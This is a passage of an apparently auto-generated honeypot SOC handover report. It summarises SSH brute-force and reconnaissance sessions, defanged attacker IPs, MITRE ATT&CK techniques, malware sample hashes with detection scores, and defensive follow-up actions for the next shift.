| `2026-03-30 10:58:36` | `cowrie.command.input` |
| `2026-03-30 10:58:36` | `cowrie.log.closed` |
| `2026-03-30 10:58:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.156.67[.]84` to AbuseIPDB if not already reported
- [ ] Block `197.156.67[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98c48e4076c1

| Field | Detail |
|---|---|
| **Source IP** | `197.156.67[.]84` |
| **First Seen** | 2026-03-30 10:59 |
| **Last Seen** | 2026-03-30 10:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 10:59:10` | `cowrie.session.connect` |
| `2026-03-30 10:59:10` | `cowrie.client.version` |
| `2026-03-30 10:59:11` | `cowrie.client.kex` |
| `2026-03-30 10:59:11` | `cowrie.login.success` |
| `2026-03-30 10:59:12` | `cowrie.session.params` |
| `2026-03-30 10:59:12` | `cowrie.command.input` |
| `2026-03-30 10:59:12` | `cowrie.log.closed` |
| `2026-03-30 10:59:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.156.67[.]84` to AbuseIPDB if not already reported
- [ ] Block `197.156.67[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38185785af86

| Field | Detail |
|---|---|
| **Source IP** | `197.156.67[.]84` |
| **First Seen** | 2026-03-30 10:59 |
| **Last Seen** | 2026-03-30 10:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 10:59:34` | `cowrie.session.connect` |
| `2026-03-30 10:59:34` | `cowrie.client.version` |
| `2026-03-30 10:59:34` | `cowrie.client.kex` |
| `2026-03-30 10:59:35` | `cowrie.login.success` |
| `2026-03-30 10:59:35` | `cowrie.session.params` |
| `2026-03-30 10:59:35` | `cowrie.command.input` |
| `2026-03-30 10:59:35` | `cowrie.log.closed` |
| `2026-03-30 10:59:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.156.67[.]84` to AbuseIPDB if not already reported
- [ ] Block `197.156.67[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `197.156.67[.]84` | **44** | 2026-03-30 10:42 | 2026-03-30 11:00 | 0m | 43 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `150.246.249[.]149` | **2** | 2026-03-30 09:12 | 2026-03-30 10:08 | 1m | 0 | `T1592` | 🟢 LOW |
| `101.126.69[.]201` | 1 | 2026-03-30 09:36 | 2026-03-30 09:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `103.48.161[.]42` | 1 | 2026-03-30 10:36 | 2026-03-30 10:37 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `108.227.37[.]243` | 1 | 2026-03-30 09:40 | 2026-03-30 09:40 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `111.23.42[.]49` | 1 | 2026-03-30 10:18 | 2026-03-30 10:18 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `117.176.204[.]214` | 1 | 2026-03-30 09:22 | 2026-03-30 09:22 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.196.22[.]11` | 1 | 2026-03-30 09:57 | 2026-03-30 09:57 | 47s | 0 | `T1592` | 🟢 LOW |
| `118.26.153[.]102` | 1 | 2026-03-30 09:42 | 2026-03-30 09:42 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `122.197.247[.]52` | 1 | 2026-03-30 10:30 | 2026-03-30 10:30 | 13s | 0 | `T1592` | 🟢 LOW |
| `172.174.17[.]234` | 1 | 2026-03-30 09:38 | 2026-03-30 09:38 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `179.184.218[.]49` | 1 | 2026-03-30 09:43 | 2026-03-30 09:43 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.76.137[.]24` | 1 | 2026-03-30 09:52 | 2026-03-30 09:54 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.250[.]38` | 1 | 2026-03-30 10:41 | 2026-03-30 10:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.15.189[.]232` | 1 | 2026-03-30 10:08 | 2026-03-30 10:08 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `197.155.225[.]93` | 1 | 2026-03-30 09:40 | 2026-03-30 09:40 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `2.74.192[.]250` | 1 | 2026-03-30 10:28 | 2026-03-30 10:28 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `222.124.14[.]234` | 1 | 2026-03-30 09:49 | 2026-03-30 09:51 | 120s | 0 | `T1592` | 🟢 LOW |
| `31.42.184[.]252` | 1 | 2026-03-30 09:59 | 2026-03-30 09:59 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `34.41.211[.]48` | 1 | 2026-03-30 10:22 | 2026-03-30 10:22 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `46.101.9[.]55` | 1 | 2026-03-30 10:48 | 2026-03-30 10:48 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.124.149[.]208` | 1 | 2026-03-30 10:55 | 2026-03-30 10:55 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.124.154[.]174` | 1 | 2026-03-30 09:09 | 2026-03-30 09:09 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.206.194[.]29` | 1 | 2026-03-30 09:49 | 2026-03-30 09:49 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.88.156[.]34` | 1 | 2026-03-30 09:09 | 2026-03-30 09:10 | 32s | 0 | `T1592` | 🟢 LOW |
| `5.11.162[.]163` | 1 | 2026-03-30 10:42 | 2026-03-30 10:42 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `78.100.64[.]148` | 1 | 2026-03-30 09:49 | 2026-03-30 09:49 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `80.223.57[.]250` | 1 | 2026-03-30 10:02 | 2026-03-30 10:02 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **28/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `179.184.218[.]49` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 36 |
| `49.206.194[.]29` | IN | Beam Telecom Pvt Ltd | **100** ⚠️ | 14 |
| `49.124.154[.]174` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 13 |
| `172.174.17[.]234` | US | Microsoft Limited | **100** ⚠️ | 23 |
| `180.76.137[.]24` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 15 |
| `222.124.14[.]234` | ID | PT. TELEKOMUNIKASI INDONESIA | **100** ⚠️ | 45 |
| `108.227.37[.]243` | US | AT&T Enterprises, LLC | **100** ⚠️ | 2 |
| `117.176.204[.]214` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `180.76.250[.]38` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `31.42.184[.]252` | UA | Virtual Systems LLC | **100** ⚠️ | 12 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 88 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 62 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 21 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 2 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 2 |

---

## 🔕 False Positive Summary (3 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 96 cases |
| Tool 34  | Credential Extractor        | ✅ 83 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 31 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 3 filtered (3.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 28 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 21 priority case(s) shown individually · 28 recon entry/entries in table (2 group(s) consolidating 46 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-30T11:00:52Z_
